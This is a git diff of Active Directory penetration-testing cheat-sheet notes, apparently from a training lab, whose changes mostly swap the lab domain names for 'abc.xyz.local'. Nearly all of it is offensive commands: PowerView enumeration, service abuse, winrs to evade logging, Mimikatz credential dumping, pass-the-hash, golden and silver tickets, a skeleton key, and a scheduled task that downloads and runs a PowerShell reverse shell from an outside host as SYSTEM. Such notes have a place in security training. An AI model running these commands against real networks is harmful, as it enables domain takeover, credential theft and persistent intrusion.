@@ -169,7 +169,7 @@ Get-NetDomain
 ###### Get object of another domain
 
 ```poweshell
-Get-NetDomain -Domain moneycorp.local
+Get-NetDomain -Domain xyz.local
 ```
 
 ###### Get domain SID for the current domain
@@ -187,7 +187,7 @@ Get-NetDomainController
 ###### Get DC for another domain
 
 ```powershell
-Get-NetDomainController -Domain moneycorp.local
+Get-NetDomainController -Domain xyz.local
 ```
 
 ###### Get a list of users in the current domain
@@ -235,7 +235,7 @@ Get-NetComputer -Domain
 Get-NetGroup *admin*
 Get-NetGroup -GroupName *admin*
 Get-NetGroup *admin* -FullData
-Get-NetGroup -GroupName *admin* -Doamin moneycorp.local
+Get-NetGroup -GroupName *admin* -Doamin xyz.local
 ```
 
 ###### Get all the members of the Domain Admins group
@@ -255,19 +255,19 @@ Get-NetGroup -UserName "student1"
 ###### List all the local groups on a machine (needs admin privilege) 
 
 ```powershell
-Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -ListGroups
+Get-NetLocalGroup -ComputerName dcorp-dc.abc.xyz.local -ListGroups
 ```
 
 ###### Get members of all the local groups on a machine (needs admin privilege)
 
 ```powershell
-Get-NetLocalGroup -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Recurse
+Get-NetLocalGroup -ComputerName dcorp-dc.abc.xyz.local -Recurse
 ```
 
 ###### Get actively logged users on a computer (needs local admin rights)
 
 ```powershell
-Get-NetLoggedon -ComputerName dcorp-dc.dollarcorp.moneycorp.local 
+Get-NetLoggedon -ComputerName dcorp-dc.abc.xyz.local 
 ```
 
 ###### Find sensitive files and shares in current domain.
@@ -289,7 +289,7 @@ Get-NetFileServer
 
 ```powershell
 Get-NetGPO
-Get-NetGPO -ComputerName dcorp-student1.dollarcorp.moneycorp.local
+Get-NetGPO -ComputerName dcorp-student1.abc.xyz.local
 Get-GPO -All (GroupPolicy module)
 Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html (Provides RSoP)
 gpresult /R /V (GroupPolicy Results of current machine)
@@ -304,7 +304,7 @@ Get-NetGPOGroup
 ##### Get users which are in a local group of a machine using GPO
 
 ```powershell
-Find-GPOComputerAdmin -ComputerName student1.dollarcorp.moneycorp.local
+Find-GPOComputerAdmin -ComputerName student1.abc.xyz.local
 ```
 
 ##### Get machines where the given user is member of a specific group
@@ -317,13 +317,8 @@ Find-GPOLocation -Username student1 -Verbose
 
 ```powershell
 Get-NetOU -FullData
-```
-
-##### Get GPO applied on an OU. Read `GPOname` from `gplink` attribute from `Get-NetOU`
-
-```powershell
-Get-NetGPO -GPOname "{AB306569-220D-43FF-BO3B-83E8F4EF8081}"
-Get-GPO -Guid AB306569-220D-43FF-B03B-83E8F4EF8081 (GroupPolicy module) 
+(Get-NetOU <ou>).gplink
+Get-NetGPO -ADSPath '<output from (Get-NetOU <ou>).gplink'
 ```
 
 ### PowerView ACL Enumeration
@@ -343,13 +338,13 @@ Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose
 ##### We can also enumerate ACLs using `ActiveDirectory` module but without resolving GUIDs
 
 ```powershell
-(Get-Acl "AD:\CN=Administrator, CN=Users, DC=dollarcorp, DC=moneycorp,DC=local").Access
+(Get-Acl "AD:\CN=Administrator, CN=Users, DC=abc, DC=xyz,DC=local").Access
 ```
 
 ##### Get the ACLs associated with the specified LDAP path to be used for search
 
 ```powershell
-Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
+Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=abc,DC=xyz,DC=local" -ResolveGUIDs -Verbose
 ```
 
 ##### Search for interesting ACEs
@@ -361,7 +356,7 @@ Invoke-ACLScanner -ResolveGUIDs
 ##### Get the ACLs associated with the specified path
 
 ```powershell
-Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
+Get-PathAcl -Path "\\dcorp-dc.abc.xyz.local\sysvol"
 ```
 
 ### PowerView Trust Enumeration
@@ -370,7 +365,7 @@ Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
 
 ```powershell
 Get-NetDomainTrust
-Get-NetDomainTrust -Domain us.dollarcorp.moneycorp.local
+Get-NetDomainTrust -Domain us.abc.xyz.local
 ```
 
 ##### Get details about the current forest
@@ -474,6 +469,7 @@ Get-ModifiableService -Verbose
 
 ```powershell
 Invoke-Allchecks
+Invoke-ServiceAbuse -Name '<ServiceName>' -UserName '<domain  >\<our_user>'
 ```
 
 ###### BeRoot is an executable:
@@ -495,21 +491,21 @@ Invoke-PrivEsc
 ###### Connect to a PS-Session of a remote user
 
 ```powershell
-Enter-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
+Enter-PSSession -Computername dcorp-adminsrv.abc.xyz.local
 ```
 
 ##### Execute Stateful commands using `Enter-PSSession` ( persistence )
 
 ```powershell
-$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
+$sess = New-PSSession -Computername dcorp-adminsrv.abc.xyz.local
 Enter-PSSession -Session $sess
 
-[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> $proc = Get-Process
-[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> exit
+[dcorp-adminsrv.abc.xyz.local]:PS> $proc = Get-Process
+[dcorp-adminsrv.abc.xyz.local]:PS> exit
 
 Enter-PSSession -Session $sess
 
-[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> proc
+[dcorp-adminsrv.abc.xyz.local]:PS> proc
 Will list current process
 ```
 
@@ -518,7 +514,7 @@ Will list current process
 ##### Execute Stateful commands using Invoke-Command ( persistence )
 
 ```powershell
-$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
+$sess = New-PSSession -Computername dcorp-adminsrv.abc.xyz.local
 Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
 Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
 ```
@@ -546,8 +542,8 @@ Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock
 ```powershell
 Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -command {whoami}
 Invoke-Command -computername computer-name -ConfigurationName dc_manage -credential $cred -ScriptBlock {whoami}
-Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -command {whoami}
-Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {whoami}
+Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -command {whoami}
+Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -ScriptBlock {whoami}
 ```
 
 ##### File execution using `ScriptBlock`
@@ -559,13 +555,13 @@ Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential 
 ##### File execution using `FilePath`
 
 ```powershell
-Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath "C:\temp\mimikatz.exe"
+Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -FilePath "C:\temp\mimikatz.exe"
 ```
 
 ##### Language Mode
 
 ```powershell
-Invoke-Command -computername dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}
+Invoke-Command -computername dcorp-adminsrv.abc.xyz.local -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}
 ```
 
 ##### Execute locally loaded function on the remote machines
@@ -588,17 +584,17 @@ Write-Output "Hello from the function"
 ###### Now we can execute the locally loaded functions
 
 ```powershell
-Invoke-Command -ScriptBlock ${function:hello} -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
+Invoke-Command -ScriptBlock ${function:hello} -ComputerName dcorp-adminsrv.abc.xyz.local
 ```
 
 ##### Directly load function on the remote machines using FilePath
 
 ```powershell
-$sess = New-PSSession -Computername dcorp-adminsrv.dollarcorp.moneycorp.local
+$sess = New-PSSession -Computername dcorp-adminsrv.abc.xyz.local
 Invoke-Command -FilePath "C:\temp\hello.ps1" -Session $sess
 Enter-PSSession -Session $sess
 
-[dcorp-adminsrv.dollarcorp.moneycorp.local]:PS> hello
+[dcorp-adminsrv.abc.xyz.local]:PS> hello
 Hello from the function
 ```
 
@@ -608,7 +604,7 @@ Hello from the function
 -   We can use **winrs** in place of **PSRemoting** to evade the logging (and still reap the benefit of 5985 allowed between hosts)
 
 ```powershell
-C:\> winrs -remote:server1 -u:server1\administrator - p:Pass@1234 hostname
+C:\> winrs -remote:us-mgmt -u:us\administrator - p:Pass@1234 cmd.exe
 ```
 
 # V. Dumping Credentials
@@ -631,7 +627,7 @@ Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
 
 ```powershell
 # Invoke-Mimikatz
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:abc.xyz.local /ntlm:<ntImhash> /run:powershell.exe"'
 
 # Invoke-Mimikatz using AES
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
@@ -1213,7 +1209,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
 ###### Create a ticket on any machine [ "pass the ticket" attack]
 
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:a9b30e5bO0dc865eadcea941le4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:abc.xyz.local /sid:S-1-5-21-268341927-4156871508-1792461683 /krbtgt:a9b30e5bO0dc865eadcea941le4ade72d /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
 ###### List Kerberos services available
@@ -1263,7 +1259,7 @@ Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
 ###### Using hash of the Domain Controller computer account, below command provides access to shares on the DC
 
 ```powershell
-Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62FF22 /user:Administrator /ptt"'
+Invoke-Mimikatz -Command '"kerberos::golden /domain:abc.xyz.local /sid:S-1-5-21-268341927-4156871508-1792461683 /target:dcorp-dc.abc.xyz.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62FF22 /user:Administrator /ptt"'
 ```
 
 ```ad-note
@@ -1274,9 +1270,9 @@ Which services? HOST, RPCSS, WSMAN and many more.
 ###### Schedule and execute a task
 
 ```powershell
-schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.psi''')'"
+schtasks /create /S dcorp-dc.abc.xyz.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.psi''')'"
 
-schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
+schtasks /Run /S dcorp-dc.abc.xyz.local /TN "STCheck"
 ```
 
 ### Skeleton Key
@@ -1286,7 +1282,7 @@ schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
 ###### Use the below command to inject a skeleton-Key
 
 ```powershell
-Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton' -ComputerName dcorp-dc.abc.xyz.local
 ```
 
 ```ad-note
@@ -1296,7 +1292,7 @@ Skeleton Key password is : **mimikatz**
 ###### Now we can access any machine with valid username and password as mimikatz
 
 ```powershell
-Enter-PSSession -Computername dcorp-dc.dollarcorp.moneycorp.local -credential dcorp\Administrator
+Enter-PSSession -Computername dcorp-dc.abc.xyz.local -credential dcorp\Administrator
 ```
 
 ###### LSASS running as a protected process
@@ -2010,7 +2006,7 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 ### MSSQL Abuse - MSSQL Database Links
 
 -   A database link allows a SQL Server to access external data sources like other SQL Servers and OLE DB data sources.
--   In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.
+-    In case of database links between SQL servers, that is, linked SQL servers it is possible to execute stored procedures.
 -   Database links work even across forest trusts.
 
 ##### Execute commands on target server
